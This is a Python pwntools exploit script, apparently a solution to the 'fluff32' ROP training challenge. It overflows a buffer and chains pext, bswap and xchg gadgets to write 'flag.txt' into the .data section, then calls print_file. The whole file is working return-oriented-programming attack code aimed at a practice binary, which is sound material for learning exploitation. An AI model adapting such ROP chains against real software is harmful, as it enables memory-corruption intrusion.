#!/usr/bin/env python3
from pwn import *

def little_to_big(int_val):
    bytes_big = int_val.to_bytes(4, byteorder='big')
    return int.from_bytes(bytes_big, byteorder='little')


# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'fluff32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./fluff32_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b"A" * cyclic_find(0x6161616c)

# 0x080485bb : pop ebp ; ret
POP_EBP = p32(0x80485bb)
# 0x08048558 : pop ecx ; bswap ecx ; ret
BSWAP = p32(0x8048558)
# 0x08048543: mov eax, ebp; mov ebx, 0xb0bababa; pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
MOV_PEXT = p32(0x8048543)
# 0x08048555: xchg byte ptr [ecx], dl; ret;
XCHG = p32(0x8048555)

# 0x00001018    0x8 0x0804a018    0x8 -rw- 0x3   PROGBITS    .data
DATA_ADDR = 0x804a018

# 0x080483d0    1      6 sym.imp.print_file
PR_FILE = p32(0x80483d0)

payload = padding
# pop mask: f
payload += POP_EBP + p32(0xb4b) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR)) + XCHG
# pop mask: l
payload += POP_EBP + p32(0x2dd) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+1)) + XCHG
# pop mask: a
payload += POP_EBP + p32(0x1d46) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+2)) + XCHG
# pop mask: g
payload += POP_EBP + p32(0xb5a) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+3)) + XCHG
# pop mask: .
payload += POP_EBP + p32(0xdb) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+4)) + XCHG
# pop mask: t
payload += POP_EBP + p32(0xacd) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+5)) + XCHG
# pop mask: x
payload += POP_EBP + p32(0x1ac5) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+6)) + XCHG
# t again
payload += POP_EBP + p32(0xacd) + MOV_PEXT
payload += BSWAP + p32(little_to_big(DATA_ADDR+7)) + XCHG
# print_file
payload += PR_FILE + p32(0xa5) + p32(DATA_ADDR) 

io = start()

io.recvuntil(b"> ")
io.send(payload)

io.interactive()
